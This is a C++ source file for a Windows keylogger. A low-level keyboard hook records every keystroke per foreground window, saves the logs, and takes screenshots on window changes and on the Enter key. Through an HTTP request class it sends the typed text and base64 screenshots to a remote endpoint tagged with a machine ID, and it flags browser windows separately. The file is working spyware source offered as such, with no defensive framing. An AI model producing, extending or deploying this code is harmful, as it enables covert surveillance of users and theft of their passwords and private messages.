#include "KeyboardHook.h"
#include "Date.h"
#include "Time.h"
#include "Build.h"
#include "WindowsData.h"
#include "Filetxt.h"
#include "Screenshot.h"
#include "httpRequest.h"
#include "ConfigReader.h"

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
bool shift = FALSE;
HWND lastWindow = NULL;


//Var Global
bool save = false;
char wTitle[1000];
std::string type = "";
std::string sTitle="";
std::string keyText = "";
std::string arrayTitle[3] = {};
int aux;

int KeyboardHook::Messsages() {
	while (msg.message != WM_QUIT) { //while we do not close our application
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		Sleep(1);
	}
	UninstallHook(); //if we close, let's uninstall our hook
	return (int)msg.wParam; //return the messages
}

std::string HookCode(DWORD code, BOOL caps, BOOL shift)
{
	std::string key;
	switch (code)
	{
		// Teclado alfabetico
	case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
	case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
	case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
	case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
	case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
	case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
	case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
	case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
	case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
	case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
	case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
	case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
	case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
	case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
	case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
	case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
	case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
	case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
	case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
	case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
	case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
	case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
	case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
	case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
	case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
	case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		// Tecla Sleep
	case VK_SLEEP: key = "[SLEEP]"; break;
		// Teclado numerico
	case VK_NUMPAD0:  key = "0"; break;
	case VK_NUMPAD1:  key = "1"; break;
	case VK_NUMPAD2: key = "2"; break;
	case VK_NUMPAD3:  key = "3"; break;
	case VK_NUMPAD4:  key = "4"; break;
	case VK_NUMPAD5:  key = "5"; break;
	case VK_NUMPAD6:  key = "6"; break;
	case VK_NUMPAD7:  key = "7"; break;
	case VK_NUMPAD8:  key = "8"; break;
	case VK_NUMPAD9:  key = "9"; break;
	case VK_MULTIPLY: key = "*"; break;
	case VK_ADD:      key = "+"; break;
	case VK_SEPARATOR: key = "-"; break;
	case VK_SUBTRACT: key = "-"; break;
	case VK_DECIMAL:  key = "."; break;
	case VK_DIVIDE:   key = "/"; break;
		// Teclas de funcion
	case VK_F1:  key = "[F1]"; break;
	case VK_F2:  key = "[F2]"; break;
	case VK_F3:  key = "[F3]"; break;
	case VK_F4:  key = "[F4]"; break;
	case VK_F5:  key = "[F5]"; break;
	case VK_F6:  key = "[F6]"; break;
	case VK_F7:  key = "[F7]"; break;
	case VK_F8:  key = "[F8]"; break;
	case VK_F9:  key = "[F9]"; break;
	case VK_F10:  key = "[F10]"; break;
	case VK_F11:  key = "[F11]"; break;
	case VK_F12:  key = "[F12]"; break;
	case VK_F13:  key = "[F13]"; break;
	case VK_F14:  key = "[F14]"; break;
	case VK_F15:  key = "[F15]"; break;
	case VK_F16:  key = "[F16]"; break;
	case VK_F17:  key = "[F17]"; break;
	case VK_F18:  key = "[F18]"; break;
	case VK_F19:  key = "[F19]"; break;
	case VK_F20:  key = "[F20]"; break;
	case VK_F21:  key = "[F22]"; break;
	case VK_F22:  key = "[F23]"; break;
	case VK_F23:  key = "[F24]"; break;
	case VK_F24:  key = "[F25]"; break;
		// Teclas 
	case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
	case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
	case VK_BACK:    key = "[BACK]"; break;
	case VK_TAB:     key = "[TAB]"; break;
	case VK_CLEAR:   key = "[CLEAR]"; break;
	case VK_RETURN:  key = "[ENTER]"; break;
	case VK_SHIFT:   key = "[SHIFT]"; break;
	case VK_CONTROL: key = "[CTRL]"; break;
	case VK_MENU:    key = "[ALT]"; break;
	case VK_PAUSE:   key = "[PAUSE]"; break;
	case VK_CAPITAL: key = "[CAP-LOCK]"; break;
	case VK_ESCAPE:  key = "[ESC]"; break;
	case VK_SPACE:   key = "[SPACE]"; break;
	case VK_PRIOR:   key = "[PAGEUP]"; break;
	case VK_NEXT:    key = "[PAGEDOWN]"; break;
	case VK_END:     key = "[END]"; break;
	case VK_HOME:    key = "[HOME]"; break;
	case VK_LEFT:    key = "[LEFT]"; break;
	case VK_UP:      key = "[UP]"; break;
	case VK_RIGHT:   key = "[RIGHT]"; break;
	case VK_DOWN:    key = "[DOWN]"; break;
	case VK_SELECT:  key = "[SELECT]"; break;
	case VK_PRINT:   key = "[PRINT]"; break;
	case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
	case VK_INSERT:  key = "[INS]"; break;
	case VK_DELETE:  key = "[DEL]"; break;
	case VK_HELP:    key = "[HELP]"; break;
		// Tecla combinada SHIFT + numeros
	case 0x30:  key = shift ? "!" : "1"; break;
	case 0x31:  key = shift ? "@" : "2"; break;
	case 0x32:  key = shift ? "#" : "3"; break;
	case 0x33:  key = shift ? "$" : "4"; break;
	case 0x34:  key = shift ? "%" : "5"; break;
	case 0x35:  key = shift ? "^" : "6"; break;
	case 0x36:  key = shift ? "&" : "7"; break;
	case 0x37:  key = shift ? "*" : "8"; break;
	case 0x38:  key = shift ? "(" : "9"; break;
	case 0x39:  key = shift ? ")" : "0"; break;
		// Teclas de windows
	case VK_LWIN:     key = "[WIN]"; break;
	case VK_RWIN:     key = "[WIN]"; break;
	case VK_LSHIFT:   key = "[SHIFT]"; break;
	case VK_RSHIFT:   key = "[SHIFT]"; break;
	case VK_LCONTROL: key = "[CTRL]"; break;
	case VK_RCONTROL: key = "[CTRL]"; break;
		// OEM Keys with shift 
	case VK_OEM_1:      key = shift ? ":" : ";"; break;
	case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
	case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
	case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
	case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
	case VK_OEM_2:      key = shift ? "?" : "/"; break;
	case VK_OEM_3:      key = shift ? "~" : "`"; break;
	case VK_OEM_4:      key = shift ? "{" : "["; break;
	case VK_OEM_5:      key = shift ? "\\" : "|"; break;
	case VK_OEM_6:      key = shift ? "}" : "]"; break;
	case VK_OEM_7:      key = shift ? "'" : "'"; break;
		//TODO: Escape this char: "
	// Action Keys
	case VK_PLAY:       key = "[PLAY]";
	case VK_ZOOM:       key = "[ZOOM]";
	case VK_OEM_CLEAR:  key = "[CLEAR]";
	case VK_CANCEL:     key = "[CTRL-C]";

	default: key = "[UNK-KEY]"; break;
	}
	return key;

}

void KeyboardHook::InstallHook() {
	if (!(MyKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, HookProcedure, NULL, 0))) {
		printf_s("Error: %x \n", GetLastError());
	}
}

void KeyboardHook::UninstallHook() {
	UnhookWindowsHookEx(MyKeyboardHook);
}

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	Date date = Date();
	Time time = Time();
	WindowsData data = WindowsData();
	Build directory = Build(data.getUserNamer());

	bool caps = FALSE;
	SHORT capsShort = GetKeyState(VK_CAPITAL);
	std::string outPut;
	std::stringstream temp;
	if (capsShort > 0)
	{
		caps = TRUE;
	}

	typedef struct tagKBDLLHOOKSTRUCT {
		DWORD     vkCode;
		DWORD     scanCode;
		DWORD     flags;
		DWORD     time;
		ULONG_PTR dwExtraInfo;
	} KBDLLHOOKSTRUCT, * PKBDLLHOOKSTRUCT, * LPKBDLLHOOKSTRUCT;

	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

	if (nCode == HC_ACTION)
	{
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			if (wParam == WM_KEYDOWN)
			{
				shift = TRUE;
			}
			if (wParam == WM_KEYUP)
			{
				shift = FALSE;
			}
			else
			{
				shift = FALSE;
			}
		}
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			HWND currentWindow = GetForegroundWindow();
			if (currentWindow != lastWindow)
			{

				temp << "\n\n[+] " << date.Dayofweek() << " - " << date.getNow() << " - " << time.getNow();
				outPut.append(temp.str());
				temp.clear();

				if (keyText.length() > 0) {
					date.setDateInt();
					time.setTimeInt();
					Filetxt file = Filetxt(directory.getPathKeyboard(), directory.getPathMouse());
					std::string image = date.getNumbers() + "-" + time.getNumbers() + "- WINDOW - " + sTitle;

					file.saveFile(
						"key",
						date.getNumbers() + "-" + time.getNumbers() + "-" + sTitle,
						date.getNow(),
						time.getNow(),
						sTitle,
						keyText
					);
					
					Screenshot screen = Screenshot(directory.getPathImage());
					screen.saveJpeg(image);
					std::string content = "data:image/jpeg;base64,";
					

					if ((arrayTitle[1].find("Edge") != string::npos) ||
						(arrayTitle[1].find("Firefox") != string::npos) ||
						(arrayTitle[1].find("Brave") != string::npos) ||
						(arrayTitle[1].find("Chrome") != string::npos)
						) {
						ConfigReader myConfig = ConfigReader(directory.getPath());
						if (myConfig.getValue("Website").compare("on") == 0) {
						
						}
						httpRequest post = httpRequest();
						post.RequestRecord(arrayTitle[1], arrayTitle[0], date.getNow(), time.getNow(), "website", keyText, data.getID());
						if (screen.getBase64(image).compare("empty") != 0) {
							content += screen.getBase64(image);
							post.RequestRecord(arrayTitle[1], arrayTitle[0], date.getNow(), time.getNow(), "screenshot", content, data.getID());
						}
					}
					else if ((arrayTitle[2].find("Edge") != string::npos) ||
						(arrayTitle[2].find("Firefox") != string::npos) ||
						(arrayTitle[2].find("Brave") != string::npos) ||
						(arrayTitle[2].find("Chrome") != string::npos)
						) {
						ConfigReader myConfig = ConfigReader(directory.getPath());
						if (myConfig.getValue("Website").compare("on") == 0) {
							httpRequest post = httpRequest();
							post.RequestRecord(arrayTitle[2], arrayTitle[1] + "-" + arrayTitle[0], date.getNow(), time.getNow(), "website", keyText, data.getID());
							if (screen.getBase64(image).compare("empty") != 0) {
								content += screen.getBase64(image);
								post.RequestRecord(arrayTitle[2], arrayTitle[1] + "-" + arrayTitle[0], date.getNow(), time.getNow(), "screenshot", content, data.getID());
							}
						}
						
					}
					else {
						if (arrayTitle[1].compare("") != 0) {
							httpRequest post = httpRequest();
							post.RequestRecord(arrayTitle[1], arrayTitle[0], date.getNow(), time.getNow(), "keystroke", keyText, data.getID());
							if (screen.getBase64(image).compare("empty") != 0) {
								content += screen.getBase64(image);
								post.RequestRecord(arrayTitle[1], arrayTitle[0], date.getNow(), time.getNow(), "screenshot", content, data.getID());
							}
						}
						else {
							httpRequest post = httpRequest();
							post.RequestRecord(sTitle, sTitle, date.getNow(), time.getNow(), "keystroke", keyText, data.getID());
							if (screen.getBase64(image).compare("empty") != 0) {
								content += screen.getBase64(image);
								post.RequestRecord(sTitle, sTitle, date.getNow(), time.getNow(), "screenshot", content, data.getID());
							}
						}

					}
					arrayTitle[0] = "";
					arrayTitle[1] = "";
					arrayTitle[2] = "";
				}
				
				GetWindowTextA(GetForegroundWindow(), wTitle, _countof(wTitle));
				sTitle = wTitle;
				
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'á'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'é'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'í'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'ó'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'ú'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), 'ñ'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), '?'), sTitle.end());
				sTitle.erase(remove(sTitle.begin(), sTitle.end(), ':'), sTitle.end());

				if (sTitle.find("\\") != -1) {
					std::string delimiter = "\\";
					size_t pos = 0;
					std::string token;
					while ((pos = sTitle.find(delimiter)) != std::string::npos) {
						token = sTitle.substr(0, pos);
						sTitle.erase(0, pos + delimiter.length());
					}
				}
				std::cout << "[-] " << sTitle << std::endl;
				std::string del = "-";
				aux = 0;
				if (sTitle.find(del) != -1) {
					std::cout << "Se encontro un -" << std::endl;
					int count = 0;
					int start = 0;
					int end = sTitle.find(del);
					while (end != -1) {
						arrayTitle[count] = sTitle.substr(start, end - start);
						std::cout << "[*]" << count << "[*]" << arrayTitle[count] << std::endl;
						start = end + del.size() + 1;
						end = sTitle.find(del, start);
						count++;
					}
					arrayTitle[count] = sTitle.substr(start, end - start);
					std::cout << "[*]" << count << "[*]" << arrayTitle[count] << std::endl;
					aux = count;
				}


				keyText.clear();
				temp << " - Current Window: " << sTitle << "\n\n";
				//outPut.append(temp.str());
				std::cout << temp.str() << std::endl;

				// Setup for next CallBack
				lastWindow = currentWindow;
				save = true;
			}

			// Now capture keys
			if (p->vkCode)
			{
				//outPut.append(HookCode(p->vkCode, caps, shift));
				temp.clear();
				temp << HookCode(p->vkCode, caps, shift);
				ConfigReader myConfig = ConfigReader(directory.getPath());
				if (temp.str().compare("[ENTER]") == 0 && myConfig.getValue("Screen_Enter").compare("on") == 0) {
					Screenshot screen = Screenshot(directory.getPathImage());
					std::string image = date.getNumbers() + "-" + time.getNumbers() + "- ENTER -" + sTitle;
					screen.saveJpeg(image);
					std::string content = "data:image/jpeg;base64,";
					httpRequest post = httpRequest();
					if (screen.getBase64(image).compare("empty") != 0) {
						content += screen.getBase64(image);
						post.RequestRecord(sTitle, sTitle, date.getNow(), time.getNow(), "screenshot", content, data.getID());
					}
				}
				keyText += HookCode(p->vkCode, caps, shift);
				
				std::cout << temp.str();
			}
		}
	}
	return CallNextHookEx(KeyboardHook::Instance().MyKeyboardHook, nCode, wParam, lParam);
}
